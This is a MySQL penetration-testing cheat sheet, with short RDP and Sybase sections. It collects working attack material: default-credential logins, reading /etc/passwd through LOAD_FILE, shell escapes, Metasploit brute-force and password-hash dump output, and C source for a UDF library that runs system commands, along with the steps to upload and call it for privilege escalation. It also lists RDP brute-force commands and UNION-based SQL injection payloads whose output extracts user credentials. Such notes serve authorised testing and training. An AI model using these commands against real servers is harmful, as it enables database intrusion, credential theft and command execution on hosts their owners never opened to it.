
    Enumeration
        nmap -A -n -p3306 <IP Address>
        nmap -A -n -PN --script:ALL -p3306 <IP Address>
        telnet IP_Address 3306
        use test; select * from test;
        To check for other DB's -- show databases
    Administration
        MySQL Network Scanner
        MySQL GUI Tools
        mysqlshow
        mysqlbinlog
    Manual Checks
        Default usernames and passwords
            username: root password:
            testing
                mysql -h <Hostname> -u root
                mysql -h <Hostname> -u root
                mysql -h <Hostname> -u root@localhost
                mysql -h <Hostname>
                mysql -h <Hostname> -u ""@localhost
        Configuration Files
            Operating System
                windows
                    config.ini
                    my.ini
                        windows\my.ini
                        winnt\my.ini
                    <InstDir>/mysql/data/
                unix
                    my.cnf
                        /etc/my.cnf
                        /etc/mysql/my.cnf
                        /var/lib/mysql/my.cnf
                        ~/.my.cnf
                        /etc/my.cnf
            Command History
                ~/.mysql.history
            Log Files
                connections.log
                update.log
                common.log
            To run many sql commands at once -- mysql -u username -p < manycommands.sql
            MySQL data directory (Location specified in my.cnf)
                Parent dir = data directory
                mysql
                test
                information_schema (Key information in MySQL)
                    Complete table list -- select table_schema,table_name from tables;
                    Exact privileges -- select grantee, table_schema, privilege_type FROM schema_privileges;
                    File privileges -- select user,file_priv from mysql.user where user='root';
                    Version -- select version();
                    Load a specific file -- SELECT LOAD_FILE('FILENAME');
            SSL Check
                mysql> show variables like 'have_openssl';
                    If there's no rows returned at all it means the the distro itself doesn't support SSL connections and probably needs to be recompiled. If its disabled it means that the service just wasn't started with ssl and can be easily fixed.
        Privilege Escalation
            Current Level of access
                mysql>select user();
                mysql>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
            Access passwords
                mysql> use mysql
                mysql> select user,password from user;
            Create a new user and grant him privileges
                mysql>create user test identified by 'test';
                mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
            Break into a shell
                mysql> \! cat /etc/passwd
                mysql> \! bash
    SQL injection
        mysql-miner.pl
            mysql-miner.pl http://target/ expected_string database
        http://www.imperva.com/resources/adc/sql_injection_signatures_evasion.html
        http://www.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/
    References.
        Design Weaknesses
            MySQL running as root
            Exposed publicly on Internet
        http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=mysql
        http://search.securityfocus.com/swsearch?sbm=%2F&metaname=alldoc&query=mysql&x=0&y=0

RDesktop port 3389 open

    Rdesktop Enumeration
        Remote Desktop Connection
    Rdestop Bruteforce
        TSGrinder
            tsgrinder.exe -w dictionary_file -l leet -d workgroup -u administrator -b -n 2 IP_Address
        Tscrack

Sybase Port 5000+ open

    Sybase Enumeration
        sybase-version ip_address from NGS
    Sybase Vulnerability Assessment
        Use DBVisualiser
            Sybase Security checksheet
                Copy output into excel spreadsheet
                Evaluate mis-configured parameters
            Manual sql input of previously reported vulnerabilties
                Advanced SQL Injection in SQL Server
                More Advanced SQL Injection
        NGS Squirrel for Sybase 



# Links

1. http://www.mysqltutorial.org/mysql-cheat-sheet.aspx
2. http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
3. https://www.rapid7.com/db/modules/exploit/windows/mysql/mysql_mof
4. http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html
5. https://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/
6. https://www.hackingarticles.in/mysql-penetration-testing-nmap/

# Mysql Enumeration
nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122


# Mysql Hacking

|**Command**|**Description**|
|:----------|:--------------|
|select @@version|Show mysql server version|
|select version()|Show mysql server version|
|SHOW STATUS|Show mysql server status information|
|show VARIABLES|Show all mysql server variables|
|select user()|Query current database user|
|SHOW VARIABLES LIKE '%datadir%'|Show all variables which include datadir string|
|select load_file('/etc/passwd');|Load file into database|
|select 0xnnnnnn... INTO **OUTFILE** '/path/to/filename'|Write data into a text file.|
|select 0xnnnnnn... INTO **DUMPFILE** '/path/to/filename'|Write data into a binary file.|

## How to install mysql server ?

Lab: ubuntu / debian

```
$ sudo apt-get install mysql-server
$ sudo systemctl start service
```

Edit `/etc/mysql/mysql.conf.d/mysqld.cnf`, and change the **bind-address**.

```
bind-address = 0.0.0.0
```

## Allow remote access

```
root@sh:~# ss -ant | grep ":3306"
LISTEN     0      80           *:3306                     *:*
root@sh:~# mysql -h 10.0.250.71 -uroot -p
Enter password:
ERROR 1130 (HY000): Host '10.0.250.71' is not allowed to connect to this MySQL server
```

Create a sql file called **adduser.sql**, and execute the command: `mysql -h 127.0.0.1 -u root -p mysql < adduser.sql`

```
CREATE USER 'mysqlsec'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'mysqlsec'@'localhost' WITH GRANT OPTION;
CREATE USER 'mysqlsec'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'mysqlsec'@'%' WITH GRANT OPTION;
```

If successful, you can access the mysql server remotely.

```
root@sh:~# mysql -h 10.0.250.71 -u mysqlsec -p mysql
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.6.30-1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
mysql> select Host,User,Password from `mysql`.`user` where User='mysqlsec';
+-----------+----------+-------------------------------------------+
| Host      | User     | Password                                  |
+-----------+----------+-------------------------------------------+
| localhost | mysqlsec | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| %         | mysqlsec | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
+-----------+----------+-------------------------------------------+
2 rows in set (0.00 sec)
```

## How to crack mysql ?

```
msf auxiliary(mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE         /tmp/pass.txt    no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.0.250.71      yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port
   STOP_ON_SUCCESS   true             yes       Stop guessing when a credential works for a host
   THREADS           10               yes       The number of concurrent threads
   USERNAME          mysqlsec         no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(mysql_login) > run

[*] 10.0.250.71:3306      - 10.0.250.71:3306 - Found remote MySQL version 5.6.30
[-] 10.0.250.71:3306      - 10.0.250.71:3306 - LOGIN FAILED: mysqlsec:AzVJmX (Incorrect: Access denied for user 'mysqlsec'@'10.0.250.67' (using password: YES))
[-] 10.0.250.71:3306      - 10.0.250.71:3306 - LOGIN FAILED: mysqlsec:j1Uyj3 (Incorrect: Access denied for user 'mysqlsec'@'10.0.250.67' (using password: YES))
[-] 10.0.250.71:3306      - 10.0.250.71:3306 - LOGIN FAILED: mysqlsec:root (Incorrect: Access denied for user 'mysqlsec'@'10.0.250.67' (using password: YES))
[-] 10.0.250.71:3306      - 10.0.250.71:3306 - LOGIN FAILED: mysqlsec:mysql (Incorrect: Access denied for user 'mysqlsec'@'10.0.250.67' (using password: YES))
[+] 10.0.250.71:3306      - MYSQL - Success: 'mysqlsec:password'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## How to dump mysql hash ?

```
msf auxiliary(mysql_hashdump) > show options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.0.250.71      yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port
   THREADS   1                yes       The number of concurrent threads
   USERNAME  mysqlsec         no        The username to authenticate as

msf auxiliary(mysql_hashdump) > run

[+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.0.250.71:3306      - Saving HashString as Loot: debian-sys-maint:*8E970943FBFAA7CF6A11A55677E8050B725D9919
[+] 10.0.250.71:3306      - Saving HashString as Loot: phpmyadmin:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.0.250.71:3306      - Saving HashString as Loot: freepbxuser:*433D16EECA646A6CCF8F024AD8CDDC070C6791C1
[+] 10.0.250.71:3306      - Saving HashString as Loot: mysqlsec:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.0.250.71:3306      - Saving HashString as Loot: mysqlsec:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## UDF Privilege Escalation

```
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);

    system(args->args[0]);

    return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
```

```
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Compile the above code into a so library file. Next, please translate the so as a hex string:

```
#!/usr/bin/python
# -*- coding: utf8 -*-

# https://www.exploit-db.com/exploits/1518/

# How to upload UDF DLL into mysql server ?
# show VARIABLES;
# select @@plugin_dir;
# SELECT CHAR (...) INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'
# SELECT 0xnnnnn INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'
# drop function if exists do_system
# create function do_system returns integer soname 'lib_mysqludf_sys.so';
# select sys_exec('id');

# How to Compile UDF Dll ?
# gcc -g -c raptor_udf2.c
# gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

import sys
import binascii


def convert(filename):
    with open(filename) as f:
        print(binascii.hexlify(f.read()))


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("python {} /path/to/lib_mysqludf_sys.so".format(sys.argv[0]))
    else:
        convert(sys.argv[1])
```

Please try to upload so file, and Using MySQL User Defined Functions called **do_system**.

```
mysql > select @@plugin_dir;
mysql > SELECT 0x7f45........0000 INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'
mysql > drop function if exists do_system
mysql > create function do_system returns integer soname 'lib_mysqludf_sys.so';
mysql > select do_system('id > /tmp/result.log');
mysql > select load_file('/tmp/result.log');
```

## Mof Privilege Escalation

If mysql is on windows, please try:

```
msf >
use exploit/windows/mysql/mysql_mof
use exploit/windows/mysql/mysql_start_up
use exploit/windows/mysql/scrutinizer_upload_exec
use exploit/windows/mysql/mysql_payload
use exploit/windows/mysql/mysql_yassl_hello
```

If enough privilege, you can also write data into os files (boot, cron, and so on).

mysql -h <IP> -u <username> -p <password>    # Login remotely
mysql -h 10.0.0.10 -u root -p toor

CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
CREATE DATABASE <database>;
GRANT ALL PRIVILEGES ON <database>.* TO 'newuser'@'localhost';
FLUSH PRIVILEGES;

SHOW DATABASES;
USE <database>;
SHOW TABLES;
SHOW FIELDS FROM <table>;

DELETE FROM <table> WHERE <field>="value";

DROP DATABASE <database>;
DROP TABLE 'table1', 'table2', 'table3';
ALTER TABLE <table> DROP COLUMN <field>;

SELECT * FROM <table>;
SELECT * FROM <table> WHERE <field>="value";
SELECT LOAD_FILE('/etc/passwd')\g;

SET PASSWORD FOR username@localhost = PASSWORD('newpassword');

UPDATE <table> SET <field>="value";

INSERT INTO <table> VALUES('John', 'Smith', 'john.smith@acme.com');

DISTINCT <field>
GROUP BY <field>
LIMIT <number>
OFFSET <number>
ORDER BY <field>
WHERE <field> IS NOT NULL
WHERE <field> LIKE

\! whoami
\! sudo whoami
\! sudo bash

Examples:
SELECT * FROM hostvulns WHERE vulnerability LIKE "%Default%" ORDER BY vulnerability;
SELECT * FROM hosts WHERE host LIKE '%|%%' escape '|'
SELECT LENGTH(vulnerability), COUNT(*) FROM hostvulns GROUP BY LENGTH(vulnerability);
SELECT DISTINCT last_name,first_name FROM contacts WHERE first_name IS NOT NULL ORDER BY last_name;
SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY email
DELETE from profiles WHERE rowid='53';
UPDATE hostvulns SET tool="Nessus";

# MySQL Injection

# General.
1 UNION SELECT 1,2,3,4
1 UNION SELECT NULL,NULL,NULL,@@hostname		ubuntu
1 UNION SELECT NULL,NULL,NULL,version()			5.7.17-0ubuntu0.16.04.2
1 UNION SELECT NULL,NULL,NULL,current_user()		root@localhost
1 UNION SELECT NULL,NULL,NULL,user()			root@localhost
1 UNION SELECT NULL,NULL,NULL,UUID()			534c63c1-2e4a-11e9-bb88-00505692e5ab

# List all dbs.
1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
	information_schema
	challenge
	mysql
	performance_schema
	sys

# List current db.
1 UNION SELECT NULL,NULL,NULL,database()
	challenge

# List tables in the current db.
1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema=‘challenge’
	comments
	users

# List column names in the table ‘comments’.
1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=‘comments’
	comments id
	comments username
	comments comment
	comments post_date

# List all the data in comments.
1 UNION SELECT NULL,NULL,NULL,CONCAT(id, 0x0A, username, 0x0A, comment, 0x0A, post_date, 0x0A) FROM comments

# List column names in the table ‘users’.
1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
	users id
	users username
	users password
	users is_admin
	users signup_date
	users USER
	users CURRENT_CONNECTIONS
        users TOTAL_CONNECTIONS

# List all the data in users.
1 UNION SELECT NULL,NULL,NULL,CONCAT(username, 0x0A, password) FROM users
fl4gk33p3r	2DCsG47k5C77X5uMwIwO
Login > Profile > flag
